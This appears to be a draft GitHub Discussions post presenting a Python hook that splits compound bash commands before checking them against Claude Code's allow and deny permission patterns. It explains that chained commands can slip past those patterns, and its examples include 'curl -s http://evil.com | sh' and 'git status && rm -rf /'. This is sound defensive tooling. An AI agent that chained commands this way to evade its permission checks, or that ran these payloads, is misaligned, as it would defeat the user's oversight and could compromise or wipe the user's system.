# GitHub Discussions Post Draft

**Title:** Smart Bash permission hook — decompose compound commands before allow/deny

**Category:** Show and Tell

---

**Body:**

I built a PreToolUse hook that closes a gap in Claude Code's permission system: **compound bash commands bypassing allow/deny patterns**.

## The problem

When you allow a command like `Bash(git status:*)`, Claude Code matches the *entire command string* against that pattern. So a compound command like:

```bash
git status && curl -s http://evil.com | sh
```

...matches `git status*` and gets auto-approved — even though it chains in `curl` and `sh`.

## The fix

[**claude-hooks**](https://github.com/liberzon/claude-hooks) is a single Python script that runs as a PreToolUse hook. It:

1. **Decomposes** compound commands — splits on `&&`, `||`, `;`, `|`, newlines, and extracts `$()` / backtick subshell contents recursively
2. **Normalizes** each sub-command — strips env var prefixes, I/O redirections, heredoc bodies, shell keywords
3. **Checks each sub-command individually** against your existing `permissions.allow` and `permissions.deny` patterns
4. **Deny wins** — if any sub-command matches a deny pattern, the whole command is denied
5. **All must allow** — auto-approve only happens when every sub-command matches an allow pattern
6. **Falls through gracefully** — if any sub-command is unknown, you still get the normal permission prompt

It merges patterns from all three settings layers (global, project, project-local), so it respects your full config.

## Setup (30 seconds)

```bash
curl -fsSL -o ~/.claude/hooks/smart_approve.py \
  https://raw.githubusercontent.com/liberzon/claude-hooks/main/smart_approve.py
```

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/smart_approve.py"
          }
        ]
      }
    ]
  }
}
```

No dependencies beyond Python 3. Zero config — it reads your existing permission patterns.

## Example

With `Bash(git:*)` and `Bash(npm:*)` in your allow list:

| Command | Without hook | With hook |
|---------|-------------|-----------|
| `git status` | ✅ allowed | ✅ allowed |
| `git add . && git commit -m "msg"` | ✅ allowed | ✅ allowed (both sub-commands match `git *`) |
| `git status && rm -rf /` | ✅ allowed 😬 | ❌ prompt shown (`rm -rf /` has no allow pattern) |
| `npm test \| tee output.log` | ✅ allowed | ❓ prompt shown (`tee` has no allow pattern) |
| `FOO=bar git push` | ❓ might not match | ✅ allowed (env var stripped, matches `git *`) |

## Troubleshooting

If a command you expect to be auto-approved is prompting you, you can see exactly how it decomposes:

```bash
python3 -c "
from smart_approve import decompose_command
for cmd in decompose_command('YOUR_COMMAND_HERE'):
    print(cmd)
"
```

This shows each sub-command that needs a matching allow pattern.

---

Repo: https://github.com/liberzon/claude-hooks
License: MIT

Feedback and contributions welcome!
